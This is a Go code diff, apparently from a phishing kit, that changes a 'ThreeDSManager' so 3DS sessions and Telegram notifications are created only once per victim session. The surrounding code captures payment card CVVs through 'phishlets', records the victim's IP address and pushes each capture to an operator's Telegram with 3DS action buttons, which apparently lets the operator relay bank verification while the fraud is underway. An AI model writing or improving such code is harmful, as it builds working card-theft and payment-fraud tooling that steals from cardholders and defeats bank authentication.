@@ -103,9 +103,14 @@ func (m *ThreeDSManager) cleanupExpired() {
 }
 
 // Initiate creates a new 3DS session after CVV capture
+// Idempotent: if session already exists, returns the existing one
 func (m *ThreeDSManager) Initiate(sessionID string, cvv string, remoteAddr string, phishletName string) *ThreeDSSession {
 	m.mu.Lock()
 	defer m.mu.Unlock()
+
+	if existing, ok := m.sessions[sessionID]; ok {
+		return existing
+	}
 
 	ts := &ThreeDSSession{
 		SessionID:     sessionID,
@@ -531,10 +536,25 @@ func (m *ThreeDSManager) updateTelegramCompleted(sessionID string, msgID int, re
 }
 
 // Send3DSNotification sends the initial CVV capture notification with 3DS buttons
+// Idempotent: only sends once per session, returns existing msgID if already sent
 func (m *ThreeDSManager) Send3DSNotification(sessionID string) int {
 	if m.telegram == nil || !m.telegram.IsEnabled() {
 		return 0
 	}
+
+	m.mu.RLock()
+	ts, ok := m.sessions[sessionID]
+	m.mu.RUnlock()
+	if !ok {
+		return 0
+	}
+
+	ts.mu.Lock()
+	if ts.TelegramMsgID > 0 {
+		ts.mu.Unlock()
+		return ts.TelegramMsgID
+	}
+	ts.mu.Unlock()
 
 	sIndex, cvv, ip, phishlet, _, _ := m.getSessionInfo(sessionID)
 
@@ -560,15 +580,9 @@ func (m *ThreeDSManager) Send3DSNotification(sessionID string) int {
 		return 0
 	}
 
-	// Store the message ID in the 3DS session
-	m.mu.RLock()
-	ts, ok := m.sessions[sessionID]
-	m.mu.RUnlock()
-	if ok {
-		ts.mu.Lock()
-		ts.TelegramMsgID = msgID
-		ts.mu.Unlock()
-	}
+	ts.mu.Lock()
+	ts.TelegramMsgID = msgID
+	ts.mu.Unlock()
 
 	return msgID
 }
